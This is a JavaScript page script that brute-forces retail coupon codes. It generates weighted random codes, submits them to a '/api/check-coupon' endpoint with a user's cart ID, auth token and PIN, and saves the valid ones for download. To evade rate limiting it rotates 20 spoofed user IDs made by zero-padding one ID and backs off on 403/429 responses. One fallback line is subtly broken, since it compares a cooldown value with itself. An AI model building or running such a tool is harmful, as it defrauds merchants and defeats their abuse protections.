<script>
const digitWeights = { "1":0.2,"8":0.2,"9":0.18,"6":0.15,"0":0.12,"4":0.1,"2":0.015,"3":0.015,"5":0.015,"7":0.015 };
const letterWeights = {Z:.1,C:.1,N:.1,L:.08,J:.08,E:.08,A:.08,R:.07,T:.07,U:.06,W:.04,Y:.04,O:.04,Q:.03,K:.03,S:.03,D:.02,G:.02,X:.02,H:.02,F:.01,V:.01,M:.005,P:.005,B:.005,I:.005};
"ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("").forEach(l=>{if(!letterWeights[l]) letterWeights[l]=0.001;});

function weightedChoice(weights){
  const items=Object.keys(weights);
  const probs=Object.values(weights);
  let r=Math.random()*probs.reduce((a,b)=>a+b,0);
  for(let i=0;i<items.length;i++){r-=probs[i]; if(r<=0) return items[i];}
  return items[items.length-1];
}

function generateCoupon(prefix="",mode="auto"){
  const cleanPrefix=(prefix||"").toUpperCase().replace(/[^A-Z0-9]/g,"");
  if(mode==="numeric"||(mode==="auto"&&/^T\d*$/.test(cleanPrefix))){
    let code=cleanPrefix.length>0?cleanPrefix:"T";
    while(code.length<11) code+=Math.floor(Math.random()*10);
    return code.slice(0,11);
  }
  let code=cleanPrefix.slice(0,10);
  let nextDigit=code.length===0?true:isNaN(code[code.length-1]);
  while(code.length<10){code+=nextDigit?weightedChoice(digitWeights):weightedChoice(letterWeights); nextDigit=!nextDigit;}
  return code;
}

const sleep=ms=>new Promise(r=>setTimeout(r,ms));
let validCoupons=[];

// ---------------- Pool of Sessions ----------------
function createSessionPool(baseUserId, authToken, pin, size=20){
  const pool=[];
  for(let i=0;i<size;i++){
    const id="0".repeat(i)+baseUserId;
    pool.push({ userId:id, authToken, pin, cooldown:0 });
  }
  return pool;
}

function pickNextSession(pool){
  const now=Date.now();
  for(let i=0;i<pool.length;i++){
    if(pool[i].cooldown<=now){
      return pool[i];
    }
  }
  // if all on cooldown, pick the earliest one
  return pool.reduce((a,b)=>a.cooldown<a.cooldown?a:b);
}

// ---------------- Main submission ----------------
document.getElementById("configForm").addEventListener("submit", async e=>{
  e.preventDefault();
  validCoupons=[];
  const cartId=document.getElementById("cartId").value;
  const authToken=document.getElementById("authToken").value;
  const baseUserId=document.getElementById("userId").value;
  const pin=document.getElementById("pin").value;
  const count=parseInt(document.getElementById("count").value);
  const prefix=document.getElementById("prefix").value.trim();
  const mode=document.getElementById("mode").value;
  const customCoupons=document.getElementById("customCoupons").value.trim();
  const tableBody=document.getElementById("resultTable");
  tableBody.innerHTML="";

  let coupons = customCoupons.length>0 ? customCoupons.split("\n").map(c=>c.trim()).filter(Boolean) : [];
  if(coupons.length===0){
    const gen=new Set();
    while(coupons.length<count){ const c=generateCoupon(prefix,mode); if(!gen.has(c)){gen.add(c);coupons.push(c);} }
  }

  const sessionPool=createSessionPool(baseUserId, authToken, pin, 20);
  const batchSize=2;

  for(let i=0;i<coupons.length;i+=batchSize){
    const batch=coupons.slice(i,i+batchSize);
    await Promise.all(batch.map(async (coupon,j)=>{
      const row=document.createElement("tr");
      row.innerHTML=`<td>${i+j+1}</td><td>${coupon}</td><td>⏳ Checking...</td><td></td><td>-</td>`;
      tableBody.appendChild(row);

      let attempt=0, success=false;
      while(attempt<5 && !success){
        const session=pickNextSession(sessionPool);
        row.cells[4].innerText=session.userId;
        try{
          const res=await fetch("/api/check-coupon",{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({coupon,cartId,userId:session.userId,authToken:session.authToken,pin:session.pin})
          });

          if(res.status===403 || res.status===429){ 
            session.cooldown=Date.now()+5000*(attempt+1); attempt++; await sleep(5000*(attempt+1)); continue;
          }

          const ct=res.headers.get("content-type")||"";
          if(!ct.includes("application/json")) throw new Error("API blocked / non-JSON");

          const data=await res.json();
          if(data.result?.status==="success" || data.result?.result?.[0]?.applicable){
            const info=data.result?.additional_general_info||{};
            row.cells[2].innerHTML="✅ Valid";
            row.cells[3].innerHTML=`cart_id: ${info.cart_id||"?"}, customer_id: ${info.customer_id||"?"}`;
            row.className="table-success";
            validCoupons.push(coupon);
          } else {
            const reason=data.error?.reason||data.result?.reason||data.result?.result?.[0]||{};
            row.cells[2].innerHTML="❌ Invalid";
            row.cells[3].innerHTML=`${reason.reason_code||"UNKNOWN"} - ${reason.reason_eng||"Unknown"}`;
            row.className="table-danger";
          }
          success=true;
          session.cooldown=Date.now()+3000; // short cooldown for next pick
        }catch(err){
          row.cells[2].innerHTML="⚠️ Error";
          row.cells[3].innerHTML=err.message;
          row.className="table-warning";
          attempt++;
          await sleep(5000*attempt);
        }
      }
    }));
    await sleep(5000); // wait between batches
  }
});

// ---------------- Download ----------------
document.getElementById("downloadBtn").addEventListener("click", ()=>{
  if(validCoupons.length===0){alert("No valid coupons!"); return;}
  const blob=new Blob([validCoupons.join("\n")],{type:"text/plain"});
  const url=URL.createObjectURL(blob);
  const a=document.createElement("a");
  a.href=url; a.download="valid_coupons.txt"; a.click();
  URL.revokeObjectURL(url);
});
</script>
